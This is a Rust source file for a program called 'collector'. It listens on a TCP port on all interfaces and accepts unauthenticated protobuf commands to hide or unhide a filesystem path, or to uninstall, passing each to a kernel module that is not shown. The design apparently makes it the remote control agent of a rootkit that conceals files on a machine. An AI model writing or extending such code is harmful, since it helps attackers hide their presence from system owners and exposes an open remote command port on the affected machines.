extern crate protobuf;
extern crate collector;
mod kernel;

use std::thread;
use std::net::{TcpListener, TcpStream};
use protobuf::Message;
use structopt::StructOpt;
use collector::gen::*;
use collector::common::*;

#[derive(StructOpt)]
#[structopt(name = "collector")]
struct CliArgs {
    /// Port to listen
    #[structopt(short, long)]
    port: i16,
}

fn to_response_result(result: kernel::CommandExecResult) -> response::Response_Result {
    return match result {
        0 => response::Response_Result::OK,
        1 => response::Response_Result::ERROR_MODULE_SYSTEM,
        2 => response::Response_Result::ERROR_MODULE_NO_PATH,
        _ => response::Response_Result::ERROR_MODULE_COMMUNICATION,
    };
}

fn exec_command(command: &commands::Command) -> response::Response_Result {
    let res = match command.get_command_type() {
        commands::Command_Type::HIDE =>
            kernel::exec_command(
                kernel::Command::Hide,
                Some(command.get_path().to_string())),
        commands::Command_Type::UNHIDE =>
            kernel::exec_command(
                kernel::Command::Unhide,
                Some(command.get_path().to_string())),
        commands::Command_Type::UNINSTALL =>
            kernel::exec_command(kernel::Command::Uninstall, None)
    };

    if res.is_err(){
        println!("Failed to exec command: {}", res.unwrap_err());
        return response::Response_Result::ERROR_MODULE_COMMUNICATION;
    }

    return to_response_result(res.unwrap());
}

fn send_response(mut stream: &TcpStream, result: response::Response_Result) {
    println!("Send response: {:?}", result);

    let mut response = response::Response::new();
    response.set_result(result);
    common::send_message(&mut stream, &response);
}

fn handle_server_request(mut stream: TcpStream) {
    println!("New connection: {}", stream.peer_addr().unwrap());

    let command = match commands::Command::parse_from_reader(&mut stream){
        Ok(command) => command,
        Err(e) => {
            eprintln!("Failed to parse message: {}", e);
            return;
        }
    };

    send_response(&mut stream, exec_command(&command));
}

fn main() {
    /*println!("{:?}", kernel::exec_command(kernel::Command::Hide, Some(String::from("Oloo"))));
    println!("{:?}", kernel::exec_command(kernel::Command::Unhide, Some(String::from("Oloo"))));
    println!("{:?}", kernel::exec_command(kernel::Command::Uninstall, None));
    return;*/

    let args = CliArgs::from_args();
    let bind_str = format!("0.0.0.0:{}", args.port);

    let listener = TcpListener::bind(bind_str).unwrap();
    println!("Listening to port {}", args.port);

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                thread::spawn(move || {
                    handle_server_request(stream)
                });
            }
            Err(e) => {
                println!("Error: {}", e);
            }
        }
    }

    drop(listener);
}
